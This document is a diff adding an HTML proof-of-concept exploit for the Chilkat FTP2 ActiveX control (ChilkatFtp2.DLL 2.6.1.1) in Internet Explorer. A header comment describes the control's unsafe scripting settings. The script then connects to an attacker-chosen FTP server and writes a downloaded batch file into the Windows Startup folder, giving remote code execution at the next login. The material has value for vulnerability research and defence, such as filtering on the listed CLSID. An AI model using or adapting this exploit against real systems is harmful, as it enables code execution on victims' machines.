@@ -1,0 +1,39 @@
+<!--
+Chilkat Software FTP2 ActiveX Component (ChilkatFtp2.DLL 2.6.1.1) Remote Code Execution poc
+by rgod
+tested against Internet Explorer 7 on Vista
+should also work with 8/9
+ActiveX Settings:
+CLSID: {302124C4-30A0-484A-9C7A-B51D5BA5306B}
+Progid: ChilkatFtp2.ChilkatFtp2.1
+Binary Path: C:\Windows\System32\CHILKA~2.DLL
+KillBitted: False
+Implements IObjectSafety: True
+Safe For Initialization (IObjectSafety): True
+Safe For Scripting (IObjectSafety): True
+
+This class allows to copy/overwrite files inside arbitrary locations ex. by the GetFile()
+method. This code creates a batch file inside the automatic startup folder,
+setup a ftp server allowing anonymous connections and place the code you want
+to be retrieved.
+This control is also used by lots of freeware applications, it was not documented so I posted here.
+Note that previous versions has a different clsid, I'm saying this for filtering purposes.
+-->
+<html>
+<object classid='clsid:302124C4-30A0-484A-9C7A-B51D5BA5306B' id='obj' />
+</object>
+<script>
+obj.UnlockComponent("suntzu"); //needed for file transfer operations, type whatever here
+obj.Port=21; //configure ftp connection
+obj.Hostname="192.168.0.1"; //change here
+obj.ConnectTimeout=5;
+obj.Passive=1;
+var x;
+x=obj.Connect(); 
+if (x==1){
+x = obj.GetFile("suntzu.txt","c:/Users/All Users/Microsoft/Windows/Start Menu/Programs/Startup/suntzu.bat"); //boom
+}
+obj.Disconnect();
+</script>
+
+original url: http://retrogod.altervista.org/9sg_chilkat.html
